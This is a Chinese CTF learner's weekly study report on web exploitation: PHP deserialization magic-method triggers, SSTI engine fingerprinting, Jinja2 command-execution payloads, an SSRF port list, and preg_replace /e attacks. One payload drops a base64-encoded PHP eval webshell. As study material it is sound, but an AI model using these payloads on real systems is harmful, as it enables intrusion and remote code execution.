# 完成事项

* ## web方面
  1. 总结了socket代理型ssrf的各类端口的考点
  
  2. 总结了ssti的引擎确定方法，并总结了jinja2、twig、smarty的解题方法
  
  3. 新学了许多php特殊性质
  
  4. 对php反序列化的魔术方法的触发进行总结
* ## 工具方面
  1. 克隆了gopherus，用来生成ssrf的payload
  
  2. 安装了whatweb，用来快速进行指纹识别
  
  3. 安装了phpggc，用于部分php反序列化题型

---

# 下周待做事项

打好isctf，在比赛中学习和总结

---

# 本周学习的知识分享

+ ## PHP 魔术方法触发
  
  ### 1. `__toString()` 的触发方式 (最丰富、最隐蔽)
  
  **核心原理**：任何时候，当 PHP **试图把一个对象当做字符串处理**，且该对象无法直接转为字符串时，就会尝试调用此方法。
  
  #### A. 显式输出/转换
  
  * `echo $obj;`
  
  * `print $obj;`
  
  * `(string)$obj;` (强制类型转换)
  
  * `"$obj"` (双引号包含，字符串插值)
  
  #### B. 字符串操作函数 (High Frequency)
  
  只要函数的参数预期是字符串，传入对象就会触发。
  
  * **正则类**：`preg_match($pattern, $obj)`, `preg_replace(...)`, `preg_split(...)`
  
  * **字符串处理类**：
    
    * `strlen($obj)`
    
    * `addslashes($obj)`
    
    * `strpos($obj, 'x')`
    
    * `strstr($obj, 'x')`
    
    * `substr($obj, 0)`
    
    * `str_replace('a', 'b', $obj)`
    
    * `trim($obj)`
    
    * `explode(',', $obj)`
    
    * `implode($obj, $arr)` (作为连接符)
  
  #### C. 文件系统函数 (CTF 必考)
  
  文件路径本质上是字符串，所以传入对象作为文件名会触发。
  
  * `file_exists($obj)`
  
  * `file_get_contents($obj)`
  
  * `file_put_contents($obj, 'content')`
  
  * `is_dir($obj)`
  
  * `is_file($obj)`
  
  * `copy($obj, 'target')`
  
  * `unlink($obj)` (删除文件)
  
  * `include($obj)` / `require($obj)`
  
  #### D. 比较与逻辑运算
  
  * **弱类型比较**：`if ($obj == 'string')`
  
  * **数组查找**：`in_array($obj, $array)` (默认非严格模式下，如果数组里有字符串，会触发对象的 toString 进行对比)
  
  * **Switch 语句**：`switch($obj) { case 'string': ... }`
  
  #### E. 其他特殊函数
  
  * `header($obj)`
  
  * `setcookie('name', $obj)`
  
  * `md5($obj)` / `sha1($obj)` (哈希函数)
  
  * `json_encode($obj)` (注意：这通常不会触发 `__toString`，除非对象实现了 `JsonSerializable`，但某些旧版本或特殊配置下可能表现不同，严谨来说 `json_encode` 主要看属性，不依赖 toString，这里做个**排除**提示) 
  
  ### 2. `__invoke()` 的触发方式 (把对象当函数)
  
  **核心原理**：当对象被当作函数调用时触发。
  
  #### A. 直接调用
  
  * `$obj();`
  
  * `$obj($param);`
  
  #### B. 回调函数 (Callback)
  
  任何接受 `callable` 类型参数的函数，如果传入对象，都会触发。
  
  * `call_user_func($obj)`
  
  * `call_user_func_array($obj, $args)`
  
  * `array_map($obj, $array)`
  
  * `array_filter($array, $obj)`
  
  * `usort($array, $obj)`
  
  * `register_shutdown_function($obj)` 
  
  ### 3. `__get()` / `__set()` 的隐式触发 (属性重载)
  
  **核心原理**：访问或修改**不存在/不可访问**的属性。
  
  #### A. `__get($name)`
  
  * **直接读取**：`echo $obj->undefined_prop;`
  
  * **自增自减**：`$obj->undefined_prop++;` (注意：这会**先触发 __get** 读取值，计算后**再触发 __set** 写入值)
  
  * **empty() 函数**：`empty($obj->undefined_prop)` (如果不定义 `__isset`，通常会尝试获取值来判断)
  
  #### B. `__set($name, $val)`
  
  * **直接赋值**：`$obj->undefined_prop = 'value';`
  
  * **自增自减**：`$obj->undefined_prop++;` (后半部分触发)
  
  * **输入流填充**：`parse_str('a=1', $obj->undefined_prop)` (极少见，但在某些变量覆盖场景下可能) 
  
  ### 4. `__call()` / `__callStatic()` 的触发
  
  **核心原理**：调用不存在的方法。
  
  #### A. `__call($func, $args)`
  
  * **直接调用**：`$obj->undefined_method();`
  
  * **SoapClient**：PHP 的 `SoapClient` 类利用了 `__call` 进行 RPC 调用，这是反序列化中利用原生类进行 SSRF 的经典操作。
  
  #### B. `__callStatic($func, $args)`
  
  * **静态调用**：`ClassName::undefined_method();` 
  
  ### 5. `__destruct()` 的触发 (生命周期结束)
  
  **核心原理**：对象销毁时。它是反序列化链最常用的**自动扳机**。
  
  * **脚本正常结束**：PHP 脚本执行完最后一行代码。
  
  * **主动销毁**：`unset($obj);`
  
  * **变量覆盖**：
    
    ```markdown
    $a = new Obj();
    $a = 123; // 原来的 Obj 对象失去引用，立即触发 __destruct
    ```
  
  * **指向 NULL**：`$a = null;`
  
  * **数组清理**：如果对象在数组里，执行 `$arr = array();` 清空数组时。
  
  * **Phar 反序列化**：当利用 `phar://` 协议读取文件时，会触发 Phar 包内 metadata 对象的反序列化，如果攻击未利用 `unserialize()` 函数，这通常是利用 `__destruct` 作为起跳点。

+ ## SSTI 引擎判断
  
  1. 如果 WhatWeb 说是 Python
     
     **核心 Payload**：`{{7*'7'}}`
  * **回显 `7777777`**：**Jinja2** (实锤)。下一步直接上 Jinja2 注入笔记。
  
  * **回显 `49`**：不可能，Python 不会把字符串 `'7'` 自动转数字。如果出了 49，说明 WhatWeb 判错了，后端其实是 PHP。
  
  * **补充验证**：如果是 Tornado，试 `{{handler.settings}}`。
  
  ### 2. 如果 WhatWeb 说是 PHP
  
  PHP 有两个大头：**Smarty** 和 **Twig**。
  
  **测试 A：区分 Twig**：`{{7*'7'}}`
  
  * **回显 `49`**：**Twig** (极大概率)。PHP 弱类型计算特征。
    
    * _进一步验证_：`{{_self.env}}`。
  
  **测试 B：区分 Smarty**
  
  如果上面没反应，或者回显了原样 {{...}}，试 Smarty 的专用格式。
      {$smarty.version}
  
  * **回显版本号 (如 3.1.x)**：**Smarty** (实锤)。
  
  ### 3. 如果 WhatWeb 说是 Java
  
  Java 引擎通常不用 `{{ }}` 做默认闭合，而是 `${ }` 或 `*{ }`。
  
  **核心 Payload**：`${7*7}`
  
  * **回显 `49`**：可能是 **FreeMarker** 或 **Thymeleaf** (老版本)。
  
  * **进阶验证 (Thymeleaf)**：试试 `__${7*7}__::.x`。

+ ## pythom_Jinja2标准利用链
  
  ### 1. 利用 `os._wrap_close` (最常见)
  
  * **适用场景**：通过爆破找到了 `os._wrap_close` 类。
  
  * **如何使用**：直接调用内部的 `popen`。
  
  * **Payload**：
    
    ```python
    {{ "".__class__.__base__.__subclasses__()[【这里填爆破出的索引号】].__init__.__globals__['popen']('【这里填命令,如 cat /flag】').read() }}
    ```
  
  ### 2. 利用 `warnings.catch_warnings` (通用性最强)
  
  * **适用场景**：`os` 模块未直接暴露，需要通过 `warnings` 模块跳转。
  
  * **如何使用**：利用 `_module` 或 `__globals__` 里的 `linecache` 跳转到 `os`。
  
  * **Payload**：
    
    ```python
    {{ [].__class__.__base__.__subclasses__()[【这里填爆破出的索引号】].__init__.__globals__['linecache'].__dict__['os'].popen('【这里填命令】').read() }}
    ```
  
  ### 3. 利用 `_frozen_importlib.BuiltinImporter` (动态加载)
  
  * **适用场景**：全局变量里彻底找不到 `os`，需要动态 `import`。
  
  * **如何使用**：调用 `load_module` 加载 `os`。
  
  * **Payload**：
    
    ```python
    {{ [].__class__.__base__.__subclasses__()[【这里填爆破出的索引号】].load_module('os').popen('【这里填命令】').read() }}
    ```

+ ## SSRF端口字典
  
  ```markup
  21
  22
  25
  80
  81
  443
  3306
  5432
  6379
  8000
  8080
  8888
  9000
  11211
  27017
  ```

+ ## PHP 变量名清洗机制
  
  在 PHP 中，合法的变量名必须由 **字母、数字、下划线**组成
  
  当 PHP 解析 `$_GET`, `$_POST` 等传入的参数名时，会扫描参数名字符串：
  
  1. **点号 `.`** → 转换为 `_`
  
  2. **空格** → 转换为 `_`
  
  3. **左方括号 `[`** → 转换为 `_`
  
  4. **加号 `+`** → 转换为 `_` (通常是因为 URL 解码变空格，空格再变下划线)
  
  若题目代码明确要求：$_GET['Ping_ip.exe']，可以传?Ping[ip.exe
  
  **原理机制**：PHP 在解析参数名时，如果遇到了 **左方括号 `[`**：
  
  1. 它会把这个 `[` 转换成 **下划线 `_`**。
  
  2. **关键点**：一旦遇到了 `[`，PHP 认为后面的内容属于“数组索引”或者“特殊结构”，它会停止把后面的 点号 `.` 转换成下划线

+ ## PHP preg_replace /e 模式
  
  函数原型
      mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )
  
  * `$pattern`：正则表达式（规则）。
  
  * `$replacement`：替换成什么（结果）。
  
  * `$subject`：去哪里找（目标字符串）。
  
  ### 正常情况
  
  ```php
  // 把 "hello" 替换成 "hi"
  preg_replace('/hello/', 'hi', 'hello world'); 
  // 输出: hi world
  ```
  
  ### 异常情况 (加上 /e)
  
  当 `$pattern` 里加上了 `/e` 修饰符：
  
  ```php
  preg_replace('/hello/e', 'system("whoami")', 'hello world');
  ```
  
  **执行流程**：
  
  1. **匹配**：在 `'hello world'` 里找到了 `'hello'`。
  
  2. **准备替换**：准备用 `'system("whoami")'` 去替换它。
  
  3. **触发 /e**：PHP 引擎发现有 `/e`，它说：“慢着！这不是普通字符串，这是代码！”
  
  4. **执行**：PHP 执行 `system("whoami")`，得到结果（比如 `root`）。
  
  5. **最终替换**：用 `root` 替换掉原来的 `hello`。
  
  6. **最终结果**：`root world`。
  
  ## 例题
  
  ```php
  <?php
  $id = $_GET['id'];
  $_SESSION['id'] = $id;
  
  function complex($re, $str) {
      // 核心漏洞点：preg_replace 配合 /e 修饰符
      // /e (Eval) 模式：PHP 会将替换后的字符串作为 PHP 代码执行
      return preg_replace(
          '/(' . $re . ')/ei',
          'strtolower("\\1")', // \\1 是反向引用，即匹配到的内容
          $str
      );
  }
  
  // 自动触发逻辑：遍历所有 GET 参数
  foreach($_GET as $re => $str) {
      echo complex($re, $str). "\n";
  }
  
  function getFlag(){
      @eval($_GET['cmd']);
  }
  ?>
  ```
  
  1. ```http
     &\S*={${getFlag()}}&cmd=system('env');
     ```
  
  2. ```http
     &\S*={${eval($_GET[1])}}&1=system('env');
     ```
  
  3. ```http
     &cmd=system('echo "PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=" | base64 -d > shell.php');
     ```
     
     `PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=` 对应 `<?php eval($_POST['pass']);?>`
     
     用蚁剑连接即可

+ ## basename() 函数漏洞
  
  * 如果路径中包含了一个 **在该字符集下无效的字节**（例如 `%ff` 在 UTF-8 中通常是无效的），`basename()` 可能会：
    
    1. **截断**: 直接丢弃该字节及其后面的内容。
    
    2. **丢弃**: 默默把这个无效字节吃掉。
    
    3. **回退**: 处理异常，返回意料之外的结果。
  
  * **实战场景**:
    
    * `path = "utils.php/%ff"`
    
    * WAF 检测: 看到结尾是 `%ff`，觉得不是 `.php`，放行。
    
    * `basename(path)`: 遇到 `%ff` 处理出错，将其丢弃，返回 `utils.php`。
    
    * 结果: 成功绕过 WAF 并读取了文件。

---

# 本周学习总结

有大框架不够，还有很多小知识点需要学习


